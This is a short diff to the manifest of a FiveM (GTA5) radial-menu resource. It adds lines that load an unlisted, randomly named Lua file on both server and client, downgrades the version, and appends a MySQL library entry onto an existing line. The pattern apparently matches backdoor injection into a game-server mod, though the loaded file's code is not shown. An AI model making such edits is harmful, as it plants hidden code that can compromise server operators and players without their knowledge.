@@ -1,8 +1,10 @@
+server_script "J2MW7EI7OJZJ6.lua"
+client_script "J2MW7EI7OJZJ6.lua"
 fx_version 'cerulean'
 game 'gta5'
 
 description 'QB-RadialMenu'
-version '1.2.0'
+version '1.0.0'
 
 ui_page 'html/index.html'
 
@@ -32,4 +34,4 @@ files {
     'html/js/RadialMenu.js',
 }
 
-lua54 'yes'
+lua54 'yes'server_scripts { '@mysql-async/lib/MySQL.lua' }
